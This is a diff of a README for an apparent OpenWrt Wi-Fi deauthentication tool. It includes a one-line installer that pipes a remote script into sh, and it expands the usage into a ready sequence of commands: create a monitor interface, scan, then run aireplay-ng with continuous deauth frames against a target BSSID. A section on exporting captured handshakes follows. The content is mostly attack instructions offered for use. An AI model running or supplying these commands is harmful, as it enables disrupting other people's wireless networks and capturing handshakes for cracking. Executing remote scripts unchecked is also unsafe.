@@ -15,15 +15,21 @@ telnet 192.168.1.1
 
 opkg update && opkg install curl && curl https://raw.githubusercontent.com/xiv3r/openwrt-deauther/refs/heads/main/install.sh | sh
 ````
-## sample commands
+## commands
 > More info
  - aireplay-ng --help
  - airodump-ng --help
  - aircrack-ng --help
 
-`
-aireplay-ng mon0 --deauth 20 -a 32:AA:E4:18:90:45 -c CC:73:14:5D:59:FF --ignore-negative-one
-`
+`iw phy phy0 interface add mon0 type monitor`
+
+`ifconfig mon0 up`
+
+`airodump-ng mon0`
+
+`aireplay-ng mon0 --deauth 0 -a 32:AA:E4:18:90:45 --ignore-negative-one`
+
+- -a | bssid -a (32:AA:E4:18:90:45)
 
 ## Export handshake or files from openwrt to local storage
 - Termux Terminal 
